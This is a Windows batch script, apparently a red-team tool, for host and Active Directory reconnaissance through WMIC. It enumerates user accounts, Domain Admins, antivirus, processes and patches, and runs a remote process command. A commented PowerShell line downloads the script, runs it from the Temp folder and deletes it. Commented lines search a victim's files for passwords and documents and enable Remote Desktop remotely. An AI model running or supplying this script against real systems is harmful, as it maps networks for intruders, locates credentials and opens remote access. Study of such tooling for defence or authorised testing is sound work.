rem powershell.exe "wget https://raw.githubusercontent.com/BankSecurity/Red_Team/master/Discovery/Host_Recon_WMIC.bat -o C:\Windows\Temp\Host_Recon_WMIC.bat;C:\Windows\Temp\Host_Recon_WMIC.bat;del C:\Windows\Temp\Host_Recon_WMIC.bat"
echo ::::HOST_Enumeration::::
echo ::::OS_Specifics::::

wmic OS get Caption,OSArchitecture,Version
wmic BIOS get Manufacturer,Name,SMBIOSBIOSVersion,Version
wmic CPU get Name,NumberOfCores,NumberOfLogicalProcessors
wmic NIC get Description,MACAddress,NetEnabled,Speed
wmic USERACCOUNT get Caption,Name,PasswordRequired,Status
wmic csproduct get vendor, version
wmic computersystem LIST full
wmic process get Name, executablepath, processid
wmic startup get Caption,Command,Location,User
wmic PRODUCT get Description,InstallDate,InstallLocation,Vendor,Version

echo ::::Local_User_Accounts::::

wmic USERACCOUNT Get Domain,Name,Sid
wmic USERACCOUNT list full
wmic useraccount get /ALL


echo ::::Netowrk_Config::::

wmic nicconfig where IPEnabled='true' get Caption,DefaultIPGateway,Description,DHCPEnabled,DHCPServer,IPAddress,IPSubnet,MACAddress

echo ::::Anti_Virus::::

wmic /namespace:\\root\securitycenter2 path antivirusproduct

echo ::::Directory_Listing_and_File Search::::

REM wmic DATAFILE where "path='\\Users\\[VICTIM_USERNAME]'" GET Name,readable,size
REM wmic DATAFILE where "drive='C:' AND Name like '%password%'" GET Name,readable,size /VALUE
REM wmic DATAFILE where "name like '%.doc'" get Name 
REM wmic DATAFILE where "name like '%.pdf'" get Name
REM wmic DATAFILE where "name like '%.xls'" get Name
REM wmic DATAFILE where "name like '%.xlsx'" get Name
REM wmic DATAFILE where "name like '%.docx'" get Name
REM wmic DATAFILE where "name like '%.ppt'" get Name

echo ::::Domain_Enumeration::::
echo ::::Domain_and_DC_Info::::

wmic NTDOMAIN GET DomainControllerAddress,DomainName,Roles /VALUE

echo ::::Domain_User_Info::::

wmic /NAMESPACE:\\root\directory\ldap PATH ds_user where "ds_samaccountname='Admin'"

echo ::::List_All_Users::::

wmic /NAMESPACE:\\root\directory\ldap PATH ds_user GET ds_samaccountname

echo ::::List_All_Groups::::

wmic /NAMESPACE:\\root\directory\ldap PATH ds_group GET ds_samaccountname

echo ::::Members_of_A_Group::::

wmic /NAMESPACE:\\root\directory\ldap PATH ds_group where "ds_samaccountname='Domain Admins'" Get ds_member /Value

echo ::::List_All_Computers::::

wmic /NAMESPACE:\\root\directory\ldap PATH ds_computer GET ds_samaccountname
wmic /NAMESPACE:\\root\directory\ldap PATH ds_computer GET ds_dnshostname

echo ::Misc:::
echo ::Execute_Remote_Command::::

wmic process call create "cmd.exe /c ping google.com"

echo ::::Peripherals::::
wmic path Win32_PnPdevice 

echo ::::Installed_Updates::::
wmic qfe list brief

REM echo ::::Enable_Remote_Desktop::::

REM wmic rdtoggle where AllowTSConnections="0" call SetAllowTSConnections "1"
REM wmic /node:remotehost path Win32_TerminalServiceSetting where AllowTSConnections="0" call SetAllowTSConnections "1"
